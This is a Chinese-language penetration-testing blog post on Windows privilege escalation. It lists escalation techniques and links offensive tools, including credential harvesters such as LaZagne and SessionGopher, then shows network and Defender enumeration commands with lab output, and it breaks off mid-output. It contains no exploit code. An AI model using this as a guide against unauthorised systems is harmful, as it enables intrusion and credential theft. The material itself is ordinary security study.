<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Windows Privilege Escalation | n2ryx&#39;s Blog</title>
  <meta name="author" content="n2ryx">
  
  <meta name="description" content="Windows 权限提升的总体目标是进一步将系统的访问权限提升到 Local Administrators 组或 NT AUTHORITY\SYSTEM LocalSystem 账户。
Privilege Escalation Ways



Privilege
Escalation



Abusing Windows group privileges
滥用 Windows 组权限


Abusing Windows user privileges
滥用 Windows 用户权限


Bypassing User Account Control
绕过用户账户控制


Abusing weak service&amp;#x2F;file permissions
滥用弱服务&amp;#x2F;文件权限


Leveraging unpatched kernel exploits
利用未修补的内核漏洞


Credential theft
凭证盗窃


Traffic Capture
流量捕获


and more.
…


Tools



Tools
Description



Seatbelt
用于执行各种本地特权升级检查的 C# 项目


winPEAS
WinPEAS 是一个脚本，用于搜索在 Windows 主机上提升权限的可能路径。所有检查均在此处说明


PowerUp.ps1
PowerShell 脚本用于查找依赖于错误配置的常见 Windows 特权提升向量。它还可用于利用发现的一些问题


SharpUp
C# 版本的 PowerUp


JAWS
使用 PowerShell 2.0 编写的用于枚举特权升级向量的 PowerShell 脚本


SessionGopher
SessionGopher 是一个 PowerShell 工具，用于查找和解密远程访问工具的已保存会话信息。它提取 PuTTY、WinSCP、SuperPuTTY、FileZilla 和 RDP 已保存的会话信息


Watson
Watson 是一个 .NET 工具，旨在枚举缺失的 KB 并建议利用权限提升漏洞。


LaZagne
用于从 Web 浏览器、聊天工具、数据库、Git、电子邮件、内存转储、PHP、系统管理工具、无线网络配置、内部 Windows 密码存储机制等检索存储在本地机器上的密码的工具


Windows Exploit Suggester - Next Generation
WES-NG 是一款基于 Windowssysteminfo实用程序输出的工具，它提供了操作系统易受攻击的漏洞列表，包括针对这些漏洞的任何攻击。Windows XP 和 Windows 10 之间的所有 Windows 操作系统（包括其 Windows Server 对应版本）均受支持


sysinternals-suite
将在枚举中使用 Sysinternals 的几种工具，包括AccessChk、PipeList和PsService


已编译好的项目 https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
Situational AwarenessNetwork Informationifconfig12345678910111213141516171819202122232425262728293031323334353637383940414243C:\&amp;gt; ipconfig /all...SNPI...Ethernet adapter Ethernet1:   Connection-specific DNS Suffix  . :   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter   Physical Address. . . . . . . . . : 00-50-56-B9-C5-4B   DHCP Enabled. . . . . . . . . . . : No   Autoconfiguration Enabled . . . . : Yes   Link-local IPv6 Address . . . . . : fe80::f055:fefd:b1b:9919%9(Preferred)   IPv4 Address. . . . . . . . . . . : 192.168.20.56(Preferred)   Subnet Mask . . . . . . . . . . . : 255.255.255.0   Default Gateway . . . . . . . . . : 192.168.20.1   DHCPv6 IAID . . . . . . . . . . . : 151015510   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-ED-DB-68-00-50-56-B9-90-94   DNS Servers . . . . . . . . . . . : 8.8.8.8   NetBIOS over Tcpip. . . . . . . . : EnabledEthernet adapter Ethernet0:   Connection-specific DNS Suffix  . : .\   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection   Physical Address. . . . . . . . . : 00-50-56-B9-90-94   DHCP Enabled. . . . . . . . . . . : Yes   Autoconfiguration Enabled . . . . : Yes   IPv6 Address. . . . . . . . . . . : dead:beef::e4db:5ea3:2775:8d4d(Preferred)   Link-local IPv6 Address . . . . . : fe80::e4db:5ea3:2775:8d4d%4(Preferred)   IPv4 Address. . . . . . . . . . . : 10.129.43.8(Preferred)   Subnet Mask . . . . . . . . . . . : 255.255.0.0   Lease Obtained. . . . . . . . . . : Thursday, March 25, 2021 9:24:45 AM   Lease Expires . . . . . . . . . . : Monday, March 29, 2021 1:28:44 PM   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:4ddf%4                                       10.129.0.1   DHCP Server . . . . . . . . . . . : 10.129.0.1   DHCPv6 IAID . . . . . . . . . . . : 50352214   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-ED-DB-68-00-50-56-B9-90-94   DNS Servers . . . . . . . . . . . : 1.1.1.1                                       8.8.8.8   NetBIOS over Tcpip. . . . . . . . : Enabled   ...SNPI..."> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="Windows Privilege Escalation"/>
  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 7.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/tool" title="All the tools.">
			  <i class="fa fa-terminal"></i>Tool
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> Windows Privilege Escalation</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p>Windows 权限提升的总体目标是进一步将系统的访问权限提升到 <code>Local Administrators</code> 组或 <code>NT AUTHORITY\SYSTEM</code> <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account">LocalSystem</a> 账户。</p>
<p><strong>Privilege Escalation Ways</strong></p>
<table>
<thead>
<tr>
<th>Privilege</th>
<th>Escalation</th>
</tr>
</thead>
<tbody><tr>
<td>Abusing Windows group privileges</td>
<td>滥用 Windows 组权限</td>
</tr>
<tr>
<td>Abusing Windows user privileges</td>
<td>滥用 Windows 用户权限</td>
</tr>
<tr>
<td>Bypassing User Account Control</td>
<td>绕过用户账户控制</td>
</tr>
<tr>
<td>Abusing weak service&#x2F;file permissions</td>
<td>滥用弱服务&#x2F;文件权限</td>
</tr>
<tr>
<td>Leveraging unpatched kernel exploits</td>
<td>利用未修补的内核漏洞</td>
</tr>
<tr>
<td>Credential theft</td>
<td>凭证盗窃</td>
</tr>
<tr>
<td>Traffic Capture</td>
<td>流量捕获</td>
</tr>
<tr>
<td>and more.</td>
<td>…</td>
</tr>
</tbody></table>
<p><strong>Tools</strong></p>
<table>
<thead>
<tr>
<th>Tools</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">Seatbelt</a></td>
<td>用于执行各种本地特权升级检查的 C# 项目</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winPEAS</a></td>
<td>WinPEAS 是一个脚本，用于搜索在 Windows 主机上提升权限的可能路径。所有检查均<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation">在此处说明</a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">PowerUp.ps1</a></td>
<td>PowerShell 脚本用于查找依赖于错误配置的常见 Windows 特权提升向量。它还可用于利用发现的一些问题</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpUp">SharpUp</a></td>
<td>C# 版本的 PowerUp</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://github.com/411Hall/JAWS">JAWS</a></td>
<td>使用 PowerShell 2.0 编写的用于枚举特权升级向量的 PowerShell 脚本</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://github.com/Arvanaghi/SessionGopher">SessionGopher</a></td>
<td>SessionGopher 是一个 PowerShell 工具，用于查找和解密远程访问工具的已保存会话信息。它提取 PuTTY、WinSCP、SuperPuTTY、FileZilla 和 RDP 已保存的会话信息</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Watson">Watson</a></td>
<td>Watson 是一个 .NET 工具，旨在枚举缺失的 KB 并建议利用权限提升漏洞。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></td>
<td>用于从 Web 浏览器、聊天工具、数据库、Git、电子邮件、内存转储、PHP、系统管理工具、无线网络配置、内部 Windows 密码存储机制等检索存储在本地机器上的密码的工具</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">Windows Exploit Suggester - Next Generation</a></td>
<td>WES-NG 是一款基于 Windows<code>systeminfo</code>实用程序输出的工具，它提供了操作系统易受攻击的漏洞列表，包括针对这些漏洞的任何攻击。Windows XP 和 Windows 10 之间的所有 Windows 操作系统（包括其 Windows Server 对应版本）均受支持</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">sysinternals-suite</a></td>
<td>将在枚举中使用 Sysinternals 的几种工具，包括<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk</a>、<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist">PipeList</a>和<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice">PsService</a></td>
</tr>
</tbody></table>
<p>已编译好的项目 <a target="_blank" rel="noopener" href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a></p>
<h1 id="Situational-Awareness"><a href="#Situational-Awareness" class="headerlink" title="Situational Awareness"></a>Situational Awareness</h1><h2 id="Network-Information"><a href="#Network-Information" class="headerlink" title="Network Information"></a>Network Information</h2><h3 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">ipconfig</span> /<span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">...<span class="title">SNPI</span>...</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Ethernet</span> <span class="title">adapter</span> <span class="title">Ethernet1</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">   <span class="title">Connection</span>-<span class="title">specific</span> <span class="title">DNS</span> <span class="title">Suffix</span>  . :</span></span><br><span class="line"><span class="function">   <span class="title">Description</span> . . . . . . . . . . . : <span class="title">vmxnet3</span> <span class="title">Ethernet</span> <span class="title">Adapter</span></span></span><br><span class="line"><span class="function">   <span class="title">Physical</span> <span class="title">Address</span>. . . . . . . . . : 00-50-56-<span class="title">B9</span>-<span class="title">C5</span>-4<span class="title">B</span></span></span><br><span class="line"><span class="function">   <span class="title">DHCP</span> <span class="title">Enabled</span>. . . . . . . . . . . : <span class="title">No</span></span></span><br><span class="line"><span class="function">   <span class="title">Autoconfiguration</span> <span class="title">Enabled</span> . . . . : <span class="title">Yes</span></span></span><br><span class="line"><span class="function">   <span class="title">Link</span>-<span class="title">local</span> <span class="title">IPv6</span> <span class="title">Address</span> . . . . . : <span class="title">fe80</span>::<span class="title">f055:fefd</span>:<span class="title">b1b</span>:9919%9(<span class="title">Preferred</span>)</span></span><br><span class="line"><span class="function">   <span class="title">IPv4</span> <span class="title">Address</span>. . . . . . . . . . . : 192.168.20.56(<span class="title">Preferred</span>)</span></span><br><span class="line"><span class="function">   <span class="title">Subnet</span> <span class="title">Mask</span> . . . . . . . . . . . : 255.255.255.0</span></span><br><span class="line"><span class="function">   <span class="title">Default</span> <span class="title">Gateway</span> . . . . . . . . . : 192.168.20.1</span></span><br><span class="line"><span class="function">   <span class="title">DHCPv6</span> <span class="title">IAID</span> . . . . . . . . . . . : 151015510</span></span><br><span class="line"><span class="function">   <span class="title">DHCPv6</span> <span class="title">Client</span> <span class="title">DUID</span>. . . . . . . . : 00-01-00-01-27-<span class="title">ED</span>-<span class="title">DB</span>-68-00-50-56-<span class="title">B9</span>-90-94</span></span><br><span class="line"><span class="function">   <span class="title">DNS</span> <span class="title">Servers</span> . . . . . . . . . . . : 8.8.8.8</span></span><br><span class="line"><span class="function">   <span class="title">NetBIOS</span> <span class="title">over</span> <span class="title">Tcpip</span>. . . . . . . . : <span class="title">Enabled</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Ethernet</span> <span class="title">adapter</span> <span class="title">Ethernet0</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">   <span class="title">Connection</span>-<span class="title">specific</span> <span class="title">DNS</span> <span class="title">Suffix</span>  . : .\</span></span><br><span class="line"><span class="function">   <span class="title">Description</span> . . . . . . . . . . . : <span class="title">Intel</span>(<span class="title">R</span>) 82574<span class="title">L</span> <span class="title">Gigabit</span> <span class="title">Network</span> <span class="title">Connection</span></span></span><br><span class="line"><span class="function">   <span class="title">Physical</span> <span class="title">Address</span>. . . . . . . . . : 00-50-56-<span class="title">B9</span>-90-94</span></span><br><span class="line"><span class="function">   <span class="title">DHCP</span> <span class="title">Enabled</span>. . . . . . . . . . . : <span class="title">Yes</span></span></span><br><span class="line"><span class="function">   <span class="title">Autoconfiguration</span> <span class="title">Enabled</span> . . . . : <span class="title">Yes</span></span></span><br><span class="line"><span class="function">   <span class="title">IPv6</span> <span class="title">Address</span>. . . . . . . . . . . : <span class="title">dead:beef</span>::<span class="title">e4db</span>:5<span class="title">ea3</span>:2775:8<span class="title">d4d</span>(<span class="title">Preferred</span>)</span></span><br><span class="line"><span class="function">   <span class="title">Link</span>-<span class="title">local</span> <span class="title">IPv6</span> <span class="title">Address</span> . . . . . : <span class="title">fe80</span>::<span class="title">e4db</span>:5<span class="title">ea3</span>:2775:8<span class="title">d4d</span>%4(<span class="title">Preferred</span>)</span></span><br><span class="line"><span class="function">   <span class="title">IPv4</span> <span class="title">Address</span>. . . . . . . . . . . : 10.129.43.8(<span class="title">Preferred</span>)</span></span><br><span class="line"><span class="function">   <span class="title">Subnet</span> <span class="title">Mask</span> . . . . . . . . . . . : 255.255.0.0</span></span><br><span class="line"><span class="function">   <span class="title">Lease</span> <span class="title">Obtained</span>. . . . . . . . . . : <span class="title">Thursday</span>, <span class="title">March</span> 25, 2021 9:24:45 <span class="title">AM</span></span></span><br><span class="line"><span class="function">   <span class="title">Lease</span> <span class="title">Expires</span> . . . . . . . . . . : <span class="title">Monday</span>, <span class="title">March</span> 29, 2021 1:28:44 <span class="title">PM</span></span></span><br><span class="line"><span class="function">   <span class="title">Default</span> <span class="title">Gateway</span> . . . . . . . . . : <span class="title">fe80</span>::250:56<span class="title">ff:feb9</span>:4<span class="title">ddf</span>%4</span></span><br><span class="line"><span class="function">                                       10.129.0.1</span></span><br><span class="line"><span class="function">   <span class="title">DHCP</span> <span class="title">Server</span> . . . . . . . . . . . : 10.129.0.1</span></span><br><span class="line"><span class="function">   <span class="title">DHCPv6</span> <span class="title">IAID</span> . . . . . . . . . . . : 50352214</span></span><br><span class="line"><span class="function">   <span class="title">DHCPv6</span> <span class="title">Client</span> <span class="title">DUID</span>. . . . . . . . : 00-01-00-01-27-<span class="title">ED</span>-<span class="title">DB</span>-68-00-50-56-<span class="title">B9</span>-90-94</span></span><br><span class="line"><span class="function">   <span class="title">DNS</span> <span class="title">Servers</span> . . . . . . . . . . . : 1.1.1.1</span></span><br><span class="line"><span class="function">                                       8.8.8.8</span></span><br><span class="line"><span class="function">   <span class="title">NetBIOS</span> <span class="title">over</span> <span class="title">Tcpip</span>. . . . . . . . : <span class="title">Enabled</span></span></span><br><span class="line"><span class="function">   </span></span><br><span class="line"><span class="function">...<span class="title">SNPI</span>...</span></span><br></pre></td></tr></table></figure>

<h3 id="arp"><a href="#arp" class="headerlink" title="arp"></a>arp</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">arp</span> -<span class="title">a</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Interface</span>: 10.129.43.8 --- 0<span class="title">x4</span></span></span><br><span class="line"><span class="function">  <span class="title">Internet</span> <span class="title">Address</span>      <span class="title">Physical</span> <span class="title">Address</span>      <span class="title">Type</span></span></span><br><span class="line"><span class="function">  10.129.0.1            00-50-56-<span class="title">b9</span>-4<span class="title">d</span>-<span class="title">df</span>     <span class="title">dynamic</span></span></span><br><span class="line"><span class="function">  10.129.43.12          00-50-56-<span class="title">b9</span>-<span class="title">da</span>-<span class="title">ad</span>     <span class="title">dynamic</span></span></span><br><span class="line"><span class="function">  10.129.43.13          00-50-56-<span class="title">b9</span>-5<span class="title">b</span>-9<span class="title">f</span>     <span class="title">dynamic</span></span></span><br><span class="line"><span class="function">  10.129.255.255        <span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>     <span class="title">static</span></span></span><br><span class="line"><span class="function">  224.0.0.22            01-00-5<span class="title">e</span>-00-00-16     <span class="title">static</span></span></span><br><span class="line"><span class="function">  224.0.0.252           01-00-5<span class="title">e</span>-00-00-<span class="title">fc</span>     <span class="title">static</span></span></span><br><span class="line"><span class="function">  224.0.0.253           01-00-5<span class="title">e</span>-00-00-<span class="title">fd</span>     <span class="title">static</span></span></span><br><span class="line"><span class="function">  239.255.255.250       01-00-5<span class="title">e</span>-7<span class="title">f</span>-<span class="title">ff</span>-<span class="title">fa</span>     <span class="title">static</span></span></span><br><span class="line"><span class="function">  255.255.255.255       <span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>     <span class="title">static</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Interface</span>: 192.168.20.56 --- 0<span class="title">x9</span></span></span><br><span class="line"><span class="function">  <span class="title">Internet</span> <span class="title">Address</span>      <span class="title">Physical</span> <span class="title">Address</span>      <span class="title">Type</span></span></span><br><span class="line"><span class="function">  192.168.20.255        <span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>     <span class="title">static</span></span></span><br><span class="line"><span class="function">  224.0.0.22            01-00-5<span class="title">e</span>-00-00-16     <span class="title">static</span></span></span><br><span class="line"><span class="function">  224.0.0.252           01-00-5<span class="title">e</span>-00-00-<span class="title">fc</span>     <span class="title">static</span></span></span><br><span class="line"><span class="function">  239.255.255.250       01-00-5<span class="title">e</span>-7<span class="title">f</span>-<span class="title">ff</span>-<span class="title">fa</span>     <span class="title">static</span></span></span><br><span class="line"><span class="function">  255.255.255.255       <span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>     <span class="title">static</span></span></span><br></pre></td></tr></table></figure>

<h3 id="route"><a href="#route" class="headerlink" title="route"></a>route</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">route</span> <span class="title">print</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">===========================================================================</span></span><br><span class="line"><span class="function"><span class="title">Interface</span> <span class="title">List</span></span></span><br><span class="line"><span class="function">  9...00 50 56 <span class="title">b9</span> <span class="title">c5</span> 4<span class="title">b</span> ......<span class="title">vmxnet3</span> <span class="title">Ethernet</span> <span class="title">Adapter</span></span></span><br><span class="line"><span class="function">  4...00 50 56 <span class="title">b9</span> 90 94 ......<span class="title">Intel</span>(<span class="title">R</span>) 82574<span class="title">L</span> <span class="title">Gigabit</span> <span class="title">Network</span> <span class="title">Connection</span></span></span><br><span class="line"><span class="function">  1...........................<span class="title">Software</span> <span class="title">Loopback</span> <span class="title">Interface</span> 1</span></span><br><span class="line"><span class="function">  3...00 00 00 00 00 00 00 <span class="title">e0</span> <span class="title">Microsoft</span> <span class="title">ISATAP</span> <span class="title">Adapter</span></span></span><br><span class="line"><span class="function">  5...00 00 00 00 00 00 00 <span class="title">e0</span> <span class="title">Teredo</span> <span class="title">Tunneling</span> <span class="title">Pseudo</span>-<span class="title">Interface</span></span></span><br><span class="line"><span class="function"> 13...00 00 00 00 00 00 00 <span class="title">e0</span> <span class="title">Microsoft</span> <span class="title">ISATAP</span> <span class="title">Adapter</span> #2</span></span><br><span class="line"><span class="function">===========================================================================</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">IPv4</span> <span class="title">Route</span> <span class="title">Table</span></span></span><br><span class="line"><span class="function">===========================================================================</span></span><br><span class="line"><span class="function"><span class="title">Active</span> <span class="title">Routes</span>:</span></span><br><span class="line"><span class="function"><span class="title">Network</span> <span class="title">Destination</span>        <span class="title">Netmask</span>          <span class="title">Gateway</span>       <span class="title">Interface</span>  <span class="title">Metric</span></span></span><br><span class="line"><span class="function">          0.0.0.0          0.0.0.0       10.129.0.1      10.129.43.8     25</span></span><br><span class="line"><span class="function">          0.0.0.0          0.0.0.0     192.168.20.1    192.168.20.56    271</span></span><br><span class="line"><span class="function">       10.129.0.0      255.255.0.0         <span class="title">On</span>-<span class="title">link</span>       10.129.43.8    281</span></span><br><span class="line"><span class="function">      10.129.43.8  255.255.255.255         <span class="title">On</span>-<span class="title">link</span>       10.129.43.8    281</span></span><br><span class="line"><span class="function">   10.129.255.255  255.255.255.255         <span class="title">On</span>-<span class="title">link</span>       10.129.43.8    281</span></span><br><span class="line"><span class="function">        127.0.0.0        255.0.0.0         <span class="title">On</span>-<span class="title">link</span>         127.0.0.1    331</span></span><br><span class="line"><span class="function">        127.0.0.1  255.255.255.255         <span class="title">On</span>-<span class="title">link</span>         127.0.0.1    331</span></span><br><span class="line"><span class="function">  127.255.255.255  255.255.255.255         <span class="title">On</span>-<span class="title">link</span>         127.0.0.1    331</span></span><br><span class="line"><span class="function">     192.168.20.0    255.255.255.0         <span class="title">On</span>-<span class="title">link</span>     192.168.20.56    271</span></span><br><span class="line"><span class="function">    192.168.20.56  255.255.255.255         <span class="title">On</span>-<span class="title">link</span>     192.168.20.56    271</span></span><br><span class="line"><span class="function">   192.168.20.255  255.255.255.255         <span class="title">On</span>-<span class="title">link</span>     192.168.20.56    271</span></span><br><span class="line"><span class="function">        224.0.0.0        240.0.0.0         <span class="title">On</span>-<span class="title">link</span>         127.0.0.1    331</span></span><br><span class="line"><span class="function">        224.0.0.0        240.0.0.0         <span class="title">On</span>-<span class="title">link</span>       10.129.43.8    281</span></span><br><span class="line"><span class="function">        224.0.0.0        240.0.0.0         <span class="title">On</span>-<span class="title">link</span>     192.168.20.56    271</span></span><br><span class="line"><span class="function">  255.255.255.255  255.255.255.255         <span class="title">On</span>-<span class="title">link</span>         127.0.0.1    331</span></span><br><span class="line"><span class="function">  255.255.255.255  255.255.255.255         <span class="title">On</span>-<span class="title">link</span>       10.129.43.8    281</span></span><br><span class="line"><span class="function">  255.255.255.255  255.255.255.255         <span class="title">On</span>-<span class="title">link</span>     192.168.20.56    271</span></span><br><span class="line"><span class="function">===========================================================================</span></span><br><span class="line"><span class="function"><span class="title">Persistent</span> <span class="title">Routes</span>:</span></span><br><span class="line"><span class="function">  <span class="title">Network</span> <span class="title">Address</span>          <span class="title">Netmask</span>  <span class="title">Gateway</span> <span class="title">Address</span>  <span class="title">Metric</span></span></span><br><span class="line"><span class="function">          0.0.0.0          0.0.0.0     192.168.20.1  <span class="title">Default</span></span></span><br><span class="line"><span class="function">===========================================================================</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">...<span class="title">SNPI</span>...</span></span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -r</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Enumerating-Protections"><a href="#Enumerating-Protections" class="headerlink" title="Enumerating Protections"></a>Enumerating Protections</h1><h2 id="Windows-Defender"><a href="#Windows-Defender" class="headerlink" title="Windows Defender"></a>Windows Defender</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-MpComputerStatus</span></span><br><span class="line"></span><br><span class="line">AMEngineVersion                 : <span class="number">1.1</span>.<span class="number">17900.7</span></span><br><span class="line">AMProductVersion                : <span class="number">4.10</span>.<span class="number">14393.2248</span></span><br><span class="line">AMServiceEnabled                : True</span><br><span class="line">AMServiceVersion                : <span class="number">4.10</span>.<span class="number">14393.2248</span></span><br><span class="line">AntispywareEnabled              : 